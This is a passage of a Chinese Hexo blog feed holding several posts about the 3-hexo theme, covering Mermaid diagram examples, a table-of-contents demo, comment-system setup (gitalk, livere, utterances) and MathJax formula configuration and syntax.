<li>修改<code>themes/3-hexo/_config.yml</code> 的 <code>mermaid.on</code>，开启主题支持<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Mermaid 支持</span></span><br><span class="line"><span class="attr">mermaid:</span></span><br><span class="line">  <span class="attr">on:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">cdn:</span> <span class="string">//cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js</span></span><br><span class="line">  <span class="comment">#cdn: //cdnjs.cloudflare.com/ajax/libs/mermaid/8.3.1/mermaid.min.js</span></span><br><span class="line">  <span class="attr">options:</span> <span class="comment"># 更多配置信息可以参考 https://mermaidjs.github.io/#/mermaidAPI</span></span><br><span class="line">    <span class="attr">theme:</span> <span class="string">&#x27;default&#x27;</span></span><br><span class="line">    <span class="attr">startOnLoad:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">flowchart:</span></span><br><span class="line">      <span class="attr">useMaxWidth:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">htmlLabels:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
<li>在markdown中，像写代码块一样写图表<br><img src="//img.saodiyang.com/FuBTJvG5xIOIcKZPnO9UX5GCwthK.png" class="lazyload" data-srcset="//img.saodiyang.com/FuBTJvG5xIOIcKZPnO9UX5GCwthK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></li>
</ol>
<h2 id="二、示例"><a href="#二、示例" class="headerlink" title="二、示例"></a>二、示例</h2><p>以下示例源码可以在这边查看 <a href="https://github.com/yelog/blog/blob/master/source/_posts/tools/3-hexo%E6%94%AF%E6%8C%81mermaid%E5%9B%BE%E8%A1%A8.md">本文源码</a><br>更多示例可以查看官网：<a href="https://mermaidjs.github.io/">https://mermaidjs.github.io</a></p>
<h3 id="1-flowchart"><a href="#1-flowchart" class="headerlink" title="1. flowchart"></a>1. flowchart</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    A--&gt;C;</span><br><span class="line">    B--&gt;D;</span><br><span class="line">    C--&gt;D;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TB</span><br><span class="line">    c1--&gt;a2</span><br><span class="line">    subgraph one</span><br><span class="line">    a1--&gt;a2</span><br><span class="line">    end</span><br><span class="line">    subgraph two</span><br><span class="line">    b1--&gt;b2</span><br><span class="line">    end</span><br><span class="line">    subgraph three</span><br><span class="line">    c1--&gt;c2</span><br><span class="line">    end</span><br></pre></td></tr></table></figure>

<h3 id="2-Sequence-diagrams"><a href="#2-Sequence-diagrams" class="headerlink" title="2.Sequence diagrams"></a>2.Sequence diagrams</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Alice</span><br><span class="line">    participant Bob</span><br><span class="line">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class="line">    loop Healthcheck</span><br><span class="line">        John-&gt;&gt;John: Fight against hypochondria</span><br><span class="line">    end</span><br><span class="line">    Note right of John: Rational thoughts &lt;br/&gt;prevail!</span><br><span class="line">    John--&gt;&gt;Alice: Great!</span><br><span class="line">    John-&gt;&gt;Bob: How about you?</span><br><span class="line">    Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>

<h3 id="3-Class-diagrams"><a href="#3-Class-diagrams" class="headerlink" title="3.Class diagrams"></a>3.Class diagrams</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">     Animal &lt;|-- Duck</span><br><span class="line">     Animal &lt;|-- Fish</span><br><span class="line">     Animal &lt;|-- Zebra</span><br><span class="line">     Animal : +int age</span><br><span class="line">     Animal : +String gender</span><br><span class="line">     Animal: +isMammal()</span><br><span class="line">     Animal: +mate()</span><br><span class="line">     class Duck&#123;</span><br><span class="line">         +String beakColor</span><br><span class="line">         +swim()</span><br><span class="line">         +quack()</span><br><span class="line">     &#125;</span><br><span class="line">     class Fish&#123;</span><br><span class="line">         -int sizeInFeet</span><br><span class="line">         -canEat()</span><br><span class="line">     &#125;</span><br><span class="line">     class Zebra&#123;</span><br><span class="line">         +bool is_wild</span><br><span class="line">         +run()</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-State-diagrams"><a href="#4-State-diagrams" class="headerlink" title="4.State diagrams"></a>4.State diagrams</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stateDiagram</span><br><span class="line">       [*] --&gt; Active</span><br><span class="line"></span><br><span class="line">       state Active &#123;</span><br><span class="line">           [*] --&gt; NumLockOff</span><br><span class="line">           NumLockOff --&gt; NumLockOn : EvNumLockPressed</span><br><span class="line">           NumLockOn --&gt; NumLockOff : EvNumLockPressed</span><br><span class="line">           --</span><br><span class="line">           [*] --&gt; CapsLockOff</span><br><span class="line">           CapsLockOff --&gt; CapsLockOn : EvCapsLockPressed</span><br><span class="line">           CapsLockOn --&gt; CapsLockOff : EvCapsLockPressed</span><br><span class="line">           --</span><br><span class="line">           [*] --&gt; ScrollLockOff</span><br><span class="line">           ScrollLockOff --&gt; ScrollLockOn : EvCapsLockPressed</span><br><span class="line">           ScrollLockOn --&gt; ScrollLockOff : EvCapsLockPressed</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-Gantt-diagrams"><a href="#5-Gantt-diagrams" class="headerlink" title="5.Gantt diagrams"></a>5.Gantt diagrams</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gantt</span><br><span class="line">       dateFormat  YYYY-MM-DD</span><br><span class="line">       title Adding GANTT diagram functionality to mermaid</span><br><span class="line"></span><br><span class="line">       section A section</span><br><span class="line">       Completed task            :done,    des1, 2014-01-06,2014-01-08</span><br><span class="line">       Active task               :active,  des2, 2014-01-09, 3d</span><br><span class="line">       Future task               :         des3, after des2, 5d</span><br><span class="line">       Future task2              :         des4, after des3, 5d</span><br><span class="line"></span><br><span class="line">       section Critical tasks</span><br><span class="line">       Completed task in the critical line :crit, done, 2014-01-06,24h</span><br><span class="line">       Implement parser and jison          :crit, done, after des1, 2d</span><br><span class="line">       Create tests for parser             :crit, active, 3d</span><br><span class="line">       Future task in critical line        :crit, 5d</span><br><span class="line">       Create tests for renderer           :2d</span><br><span class="line">       Add to mermaid                      :1d</span><br><span class="line"></span><br><span class="line">       section Documentation</span><br><span class="line">       Describe gantt syntax               :active, a1, after des1, 3d</span><br><span class="line">       Add gantt diagram to demo page      :after a1  , 20h</span><br><span class="line">       Add another diagram to demo page    :doc1, after a1  , 48h</span><br><span class="line"></span><br><span class="line">       section Last section</span><br><span class="line">       Describe gantt syntax               :after doc1, 3d</span><br><span class="line">       Add gantt diagram to demo page      :20h</span><br><span class="line">       Add another diagram to demo page    :48h</span><br></pre></td></tr></table></figure>

<h3 id="6-Pie-chart-diagrams"><a href="#6-Pie-chart-diagrams" class="headerlink" title="6.Pie chart diagrams"></a>6.Pie chart diagrams</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pie</span><br><span class="line">    &quot;Dogs&quot; : 386</span><br><span class="line">    &quot;Cats&quot; : 85</span><br><span class="line">    &quot;Rats&quot; : 15</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo文章内toc生成</title>
    <url>//3-hexo-toc</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="1-如何使用"><a href="#1-如何使用" class="headerlink" title="1. 如何使用"></a>1. 如何使用</h2><h3 id="1-1-关键字"><a href="#1-1-关键字" class="headerlink" title="1.1 关键字"></a>1.1 关键字</h3><p>只要在在文章中使用如下关键字，不区分大小写，便可以在相应位置显示目录导航，效果文章开头<br><img src="https://i.loli.net/2020/05/23/Zq9jCWfwxNBpcOm.png" class="lazyload" data-srcset="https://i.loli.net/2020/05/23/Zq9jCWfwxNBpcOm.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="toc"></p>
<h3 id="1-2-小标题2jlksjdflksdjflksjdflksjdflkaj-sdfjka-lskdjfla-skjdf-lajsdflkjal-sdjkf-laskjdf"><a href="#1-2-小标题2jlksjdflksdjflksjdflksjdflkaj-sdfjka-lskdjfla-skjdf-lajsdflkjal-sdjkf-laskjdf" class="headerlink" title="1.2 小标题2jlksjdflksdjflksjdflksjdflkaj;sdfjka;lskdjfla;skjdf;lajsdflkjal;sdjkf;laskjdf"></a>1.2 小标题2jlksjdflksdjflksjdflksjdflkaj;sdfjka;lskdjfla;skjdf;lajsdflkjal;sdjkf;laskjdf</h3><p>占位<br>占位</p>
<h4 id="1-3-小标题"><a href="#1-3-小标题" class="headerlink" title="1.3 小标题"></a>1.3 小标题</h4><p>占位<br>占位<br>占位</p>
<h2 id="2-标题二"><a href="#2-标题二" class="headerlink" title="2. 标题二"></a>2. 标题二</h2><p>占位<br><br>占位<br><br>占位<br></p>
<h3 id="2-1-小标题"><a href="#2-1-小标题" class="headerlink" title="2.1 小标题"></a>2.1 小标题</h3><p>占位<br><br>占位<br></p>
<h3 id="2-2-小标题2"><a href="#2-2-小标题2" class="headerlink" title="2.2 小标题2"></a>2.2 小标题2</h3><p>占位<br><br>占位<br><br>占位<br><br>占位<br><br>占位<br></p>
<h2 id="文末"><a href="#文末" class="headerlink" title="文末"></a>文末</h2><p>占位<br><br>占位<br><br>占位<br><br>占位<br><br>占位<br></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo评论设置</title>
    <url>//3-hexo-comment</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前 <code>3-hexo</code> 已经集成了评论系统有 <code>gitalk</code> 、<code>gitment</code>、 <code>disqus</code> 、<code>来必力</code>、<code>utteranc</code></p>
<h2 id="一、gitalk"><a href="#一、gitalk" class="headerlink" title="一、gitalk"></a>一、gitalk</h2><p>gitalk 是一款基于 Github Issue 和 Preact 开发的评论插件 官网: <a href="https://gitalk.github.io/">https://gitalk.github.io/</a></p>
<h3 id="1-登录-github-，注册应用"><a href="#1-登录-github-，注册应用" class="headerlink" title="1. 登录 github ，注册应用"></a>1. 登录 github ，注册应用</h3><p><a href="https://github.com/settings/applications/new">点击进行注册</a> ，如下</p>
<p><img src="https://i.loli.net/2020/05/23/6BmnUbX5gzPHqk1.png" class="lazyload" data-srcset="https://i.loli.net/2020/05/23/6BmnUbX5gzPHqk1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="注册应用"></p>
<p>注册完后，可得到 <code>Client ID</code> 和 <code>Client Secret</code></p>
<h3 id="2-新建存放评论的仓库"><a href="#2-新建存放评论的仓库" class="headerlink" title="2. 新建存放评论的仓库"></a>2. 新建存放评论的仓库</h3><p>因为 <code>gitalk</code> 是基于 Github 的 Issue 的，所以需要指定一个仓库，用来承接 gitalk 的评论，我们一般使用 Github Page 来做我们博客的评论，所以，新建仓库名为 <code>xxx.github.io</code>，其中 xxx 为你的 Github 用户名</p>
<h3 id="3-配置主题"><a href="#3-配置主题" class="headerlink" title="3. 配置主题"></a>3. 配置主题</h3><p>在主题下 <code>_config.yml</code> 中找到如下配置，启用评论，并使用 <code>gitalk</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">##########评论设置#############</span></span><br><span class="line"><span class="attr">comment:</span></span><br><span class="line">  <span class="attr">on:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">gitalk</span></span><br></pre></td></tr></table></figure>

<p>在主题下 <code>_config.yml</code> 中找到 gitalk 配置，将 第1步 得到的  <code>Client ID</code> 和 <code>Client Secret</code> 复制到如下位置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">githubID:</span>    <span class="comment"># 填你的 github 用户名</span></span><br><span class="line">  <span class="attr">repo:</span>  <span class="string">xxx.github.io</span>	 <span class="comment"># 承载评论的仓库，一般使用 Github Page 仓库</span></span><br><span class="line">  <span class="attr">ClientID:</span>   <span class="comment"># 第1步获得 Client ID</span></span><br><span class="line">  <span class="attr">ClientSecret:</span>  <span class="comment"># 第1步获得 Client Secret</span></span><br><span class="line">  <span class="attr">adminUser:</span>     <span class="comment"># Github 用户名</span></span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line">  <span class="attr">perPage:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>



<h2 id="二、来必力"><a href="#二、来必力" class="headerlink" title="二、来必力"></a>二、来必力</h2><h3 id="1-创建来必力账号，并选择-City-免费版"><a href="#1-创建来必力账号，并选择-City-免费版" class="headerlink" title="1. 创建来必力账号，并选择 City 免费版"></a>1. 创建来必力账号，并选择 City 免费版</h3><p>官网<a href="http://livere.com/">http://livere.com/</a> ，创建账号，点击上面的安装，选择 City 免费版</p>
<p><img src="https://i.loli.net/2020/05/23/mLYfjrJ1UgOIpiD.png" class="lazyload" data-srcset="https://i.loli.net/2020/05/23/mLYfjrJ1UgOIpiD.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="选择 city 免费版"></p>
<p>复制获取到的代码中的 <code>data-uid</code></p>
<p><img src="http://yelog-img.test.upcdn.net/447D431A-998C-4327-9463-A51D7CE91CE3.png" class="lazyload" data-srcset="http://yelog-img.test.upcdn.net/447D431A-998C-4327-9463-A51D7CE91CE3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="复制 data-uid"></p>
<h3 id="2-主题选择使用来必力评论"><a href="#2-主题选择使用来必力评论" class="headerlink" title="2. 主题选择使用来必力评论"></a>2. 主题选择使用来必力评论</h3><p>在主题下 <code>_config.yml</code>  </p>
<p>在找到来必力配置如下，第一步中复制的 <code>data-uid</code> 粘贴到下面 <code>data_uid</code> 处</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">livere:</span></span><br><span class="line">  <span class="attr">data_uid:</span> <span class="string">xxxxxx</span></span><br></pre></td></tr></table></figure>

<p>找到以下代码， 开启并选择 livere (来必力)</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">##########评论设置#############</span></span><br><span class="line"><span class="attr">comment:</span></span><br><span class="line">  <span class="attr">on:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">livere</span></span><br></pre></td></tr></table></figure>



<h2 id="三、utteranc"><a href="#三、utteranc" class="headerlink" title="三、utteranc"></a>三、utteranc</h2><p>官网地址：<a href="https://utteranc.es/">https://utteranc.es/</a></p>
<h3 id="1-安装-utterances"><a href="#1-安装-utterances" class="headerlink" title="1. 安装 utterances"></a>1. 安装 utterances</h3><p><a href="https://github.com/apps/utterances">点我进行安装</a></p>
<h3 id="2-配置主题"><a href="#2-配置主题" class="headerlink" title="2. 配置主题"></a>2. 配置主题</h3><p>在主题下 <code>_config.yml</code> 中找到 <code>utteranc</code> 的配置 ，修改 <code>repo</code> 为自己的仓库名</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">utteranc:</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">xxx/xxx.github.io</span> <span class="comment"># 承载评论的仓库，填上自己的仓库</span></span><br><span class="line">  <span class="attr">issue_term:</span> <span class="string">pathname</span>    <span class="comment"># Issue 与 博客文章 之间映射关系</span></span><br><span class="line">  <span class="attr">label:</span> <span class="string">utteranc</span>         <span class="comment"># 创建的 Issue 添加的标签</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">github-light</span>     <span class="comment"># 主题，可选主题请查看官方文档 https://utteranc.es/#heading-theme</span></span><br><span class="line"><span class="comment"># 官方文档 https://utteranc.es/</span></span><br><span class="line"><span class="comment"># 使用说明 https://yelog.org//2020/05/23/3-hexo-comment/</span></span><br></pre></td></tr></table></figure>

<p>在主题下 <code>_config.yml</code> 中找到如下配置，启用评论，并使用 <code>utteranc</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comment:</span></span><br><span class="line">  <span class="attr">on:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">utteranc</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo配置MathJax数学公式渲染</title>
    <url>//3-hexo-mathjax</url>
    <content><![CDATA[<hr>
在用 markdown 写文档时，免不了碰到数学公式。

<h2 id="处理hexo的MarkDown渲染器与MathJax的冲突"><a href="#处理hexo的MarkDown渲染器与MathJax的冲突" class="headerlink" title="处理hexo的MarkDown渲染器与MathJax的冲突"></a>处理hexo的MarkDown渲染器与MathJax的冲突</h2><p>由于hexo的MarkDown渲染器与MathJax有冲突，所以在使用之前需要修改两个地方。</p>
<p>编辑 <code>node_modules\marked\lib\marked.js</code> 脚本</p>
<ol>
<li>将451行 ，这一步取消了对 <code>\\,\&#123;,\&#125;</code> 的转义(escape)<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">escape</span>: <span class="regexp">/^\\([\\`*&#123;&#125;\[\]()# +\-.!_&gt;])/</span>,</span><br><span class="line">改为</span><br><span class="line"><span class="attr">escape</span>: <span class="regexp">/^\\([`*\[\]()# +\-.!_&gt;])/</span>,</span><br></pre></td></tr></table></figure></li>
<li>将459行，这一步取消了对斜体标记 <code>_</code> 的转义<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">em: <span class="regexp">/^\b_((?:[^_]|__)+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br><span class="line">改为</span><br><span class="line"><span class="attr">em</span>:<span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="开启MathJax"><a href="#开启MathJax" class="headerlink" title="开启MathJax"></a>开启MathJax</h2><p>修改 <code>3-hexo/_config.yml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># MathJax 数学公式支持</span><br><span class="line">mathjax:</span><br><span class="line">  on: true #是否启用</span><br><span class="line">  per_page: false # 若只渲染单个页面，此选项设为false，页面内加入 mathjax: true</span><br></pre></td></tr></table></figure>
<p>考虑到页面的加载速度，支持渲染单个页面。</p>
<p>设置 <code>per_page: false</code> ,在需要渲染的页面内 加入 <code>mathjax: true</code></p>
<p>这样，就可以在页面内写MathJax公式了。</p>
<h2 id="MathJax公式书写"><a href="#MathJax公式书写" class="headerlink" title="MathJax公式书写"></a>MathJax公式书写</h2><p>公式书写依然按照MarkDown语法来，基本上也和LaTeX相同，单 <code>$</code> 符引住的是行内公式，双$符引住的是行间公式。</p>
<ul>
<li>MathJax公式书写参考<br><a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">MathJax basic tutorial and quick reference</a></li>
</ul>
<h3 id="1-MathJax行内公式"><a href="#1-MathJax行内公式" class="headerlink" title="1.MathJax行内公式"></a>1.MathJax行内公式</h3><p>含有下划线 <code>_</code> 的公式 <code>$x_mu$</code> ： $x_mu$</p>
<p>希腊字符 <code>$\sigma$</code> ： $\sigma$</p>
<p>双 <code>\\</code> 公式内换行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">f(n) =</span><br><span class="line">\begin&#123;cases&#125;</span><br><span class="line">n/<span class="number">2</span>,  &amp; \text&#123;<span class="keyword">if</span> $n$ is even&#125; \\</span><br><span class="line"><span class="number">3n</span>+<span class="number">1</span>, &amp; \text&#123;<span class="keyword">if</span> $n$ is odd&#125;</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>$$<br>f(n) =<br>\begin{cases}<br>n/2,  &amp; \text{if $n$ is even} \<br>3n+1, &amp; \text{if $n$ is odd}<br>\end{cases}<br>$$</p>
<p>行内公式 <code>$y=ax+b$</code>：$y=ax+b$</p>
<p>行内公式 <code>$\cos 2\theta = \cos^2 \theta - \sin^2 \theta = 2 \cos^2 \theta$</code>：$\cos 2\theta = \cos^2 \theta - \sin^2 \theta = 2 \cos^2 \theta$</p>
<p>行内公式 <code>$M(\beta^&#123;\ast&#125;(D),D) \subseteq C$</code> ： $M(\beta^{\ast}(D),D) \subseteq C$</p>
<h3 id="2-MathJax行间公式"><a href="#2-MathJax行间公式" class="headerlink" title="2.MathJax行间公式"></a>2.MathJax行间公式</h3><p>行间公式<code>$$ \sum_&#123;i=0&#125;^n i^2 = \frac&#123;(n^2+n)(2n+1)&#125;&#123;6&#125; $$</code>：<br>$$ \sum_{i=0}^n i^2 = \frac{(n^2+n)(2n+1)}{6} $$</p>
<p>行间公式<code>$$ x = \dfrac&#123;-b \pm \sqrt&#123;b^2 - 4ac&#125;&#125;&#123;2a&#125; $$</code>：<br>$$ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$</p>
<h3 id="3-MathJax公式自动编号"><a href="#3-MathJax公式自动编号" class="headerlink" title="3.MathJax公式自动编号"></a>3.MathJax公式自动编号</h3><p>书写时使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>进行公式自动编号，同时会自动连续编号，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">\sum_&#123;i=0&#125;^n F_i \cdot \phi (H, p_i) - \sum_&#123;i=1&#125;^n a_i \cdot ( \tilde&#123;x_i&#125;, \tilde&#123;y_i&#125;) + b_i \cdot ( \tilde&#123;x_i&#125;^2 , \tilde&#123;y_i&#125;^2 )</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">$$</span><br><span class="line">$$</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">\beta^*(D) = \mathop&#123;argmin&#125; \limits_&#123;\beta&#125; \lambda &#123;||\beta||&#125;^2 + \sum_&#123;i=1&#125;^n max(0, 1 - y_i f_&#123;\beta&#125;(x_i))</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>$$<br>\begin{equation}<br>\sum_{i=0}^n F_i \cdot \phi (H, p_i) - \sum_{i=1}^n a_i \cdot ( \tilde{x_i}, \tilde{y_i}) + b_i \cdot ( \tilde{x_i}^2 , \tilde{y_i}^2 )<br>\end{equation}<br>$$<br>$$<br>\begin{equation}<br>\beta^*(D) = \mathop{argmin} \limits_{\beta} \lambda {||\beta||}^2 + \sum_{i=1}^n max(0, 1 - y_i f_{\beta}(x_i))<br>\end{equation}<br>$$</p>
<h2 id="MathJax公式手动编号"><a href="#MathJax公式手动编号" class="headerlink" title="MathJax公式手动编号"></a>MathJax公式手动编号</h2><p>可以在公式书写时使用 <code>\tag&#123;手动编号&#125;</code> 添加手动编号，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">\sum_&#123;i=0&#125;^n F_i \cdot \phi (H, p_i) - \sum_&#123;i=1&#125;^n a_i \cdot ( \tilde&#123;x_i&#125;, \tilde&#123;y_i&#125;) + b_i \cdot ( \tilde&#123;x_i&#125;^2 , \tilde&#123;y_i&#125;^2 ) \tag&#123;1.2.3&#125;</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>$$<br>\begin{equation}<br>\sum_{i=0}^n F_i \cdot \phi (H, p_i) - \sum_{i=1}^n a_i \cdot ( \tilde{x_i}, \tilde{y_i}) + b_i \cdot ( \tilde{x_i}^2 , \tilde{y_i}^2 ) \tag{1.2.3}<br>\end{equation}<br>$$</p>
<p>不加 <code>\begin&#123;equation&#125; \end&#123;equation&#125;</code> 也可以，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\beta^*(D) = \mathop&#123;argmin&#125; \limits_&#123;\beta&#125; \lambda &#123;||\beta||&#125;^2 + \sum_&#123;i=1&#125;^n max(0, 1 - y_i f_&#123;\beta&#125;(x_i)) \tag&#123;我的公式3&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>$$<br>\beta^*(D) = \mathop{argmin} \limits_{\beta} \lambda {||\beta||}^2 + \sum_{i=1}^n max(0, 1 - y_i f_{\beta}(x_i)) \tag{我的公式3}<br>$$</p>
<p>行内公式加\tag{}后会自动成为行间公式，例如： <code>$z = (p_0, ..... , p_n) \tag&#123;公式21&#125; $</code><br>$z = (p_0, ….. , p_n) \tag{公式21} $</p>
<h3 id="4-其他公式书写技巧"><a href="#4-其他公式书写技巧" class="headerlink" title="4.其他公式书写技巧"></a>4.其他公式书写技巧</h3><p><strong>如何将下标放到正下方？</strong><br>① 如果是数学符号，那么直接用 <code>\limits</code> 命令放在正下方，如Max函数下面的取值范围，需要放在Max的正下方。可以如下实现：<br><code>$ \max \limits_&#123;a&lt;x&lt;b&#125;\&#123;f(x)\&#125; $</code><br>$ \max \limits_{a&lt;x&lt;b}{f(x)} $</p>
<p>② 若是普通符号，那么要用 <code>\mathop</code> 先转成数学符号再用 <code>\limits</code>，如<br><code>$ \mathop&#123;a&#125;\limits_&#123;i=1&#125; $</code><br>$ \mathop{a}\limits_{i=1} $</p>
<p><strong>MathJax矩阵输入</strong><br>无括号矩阵：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;matrix&#125;</span><br><span class="line">1 &amp; x &amp; x^2 \\</span><br><span class="line">1 &amp; y &amp; y^2 \\</span><br><span class="line">1 &amp; z &amp; z^2 \\</span><br><span class="line">\end&#123;matrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>$$<br>\begin{matrix}<br>1 &amp; x &amp; x^2 \<br>1 &amp; y &amp; y^2 \<br>1 &amp; z &amp; z^2 \<br>\end{matrix}<br>$$</p>
<p>有括号有竖线矩阵：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\left[</span><br><span class="line">    \begin&#123;array&#125;&#123;cc|c&#125;</span><br><span class="line">      1&amp;2&amp;3\\</span><br><span class="line">      4&amp;5&amp;6</span><br><span class="line">    \end&#123;array&#125;</span><br><span class="line">\right]</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<p>$$<br>\left[<br>    \begin{array}{cc|c}<br>      1&amp;2&amp;3\<br>      4&amp;5&amp;6<br>    \end{array}<br>\right]<br>$$</p>
<p>行内小矩阵：<br><code>$\bigl( \begin&#123;smallmatrix&#125; a &amp; b \\ c &amp; d \end&#123;smallmatrix&#125; \bigr)$</code><br>$\bigl( \begin{smallmatrix} a &amp; b \ c &amp; d \end{smallmatrix} \bigr)$</p>
<p>这里有个问题，上面的写法在矩阵内没有换行，我看了下源码，双反斜杠\又被MarkDown渲染引擎转义为单个反斜杠了，解决方法是写三个反斜杠\\或在双反斜杠后换行即可：</p>
<p><code>$\bigl( \begin&#123;smallmatrix&#125; a &amp; b \\\ c &amp; d \end&#123;smallmatrix&#125; \bigr)$</code><br>$\bigl( \begin{smallmatrix} a &amp; b \\ c &amp; d \end{smallmatrix} \bigr)$</p>
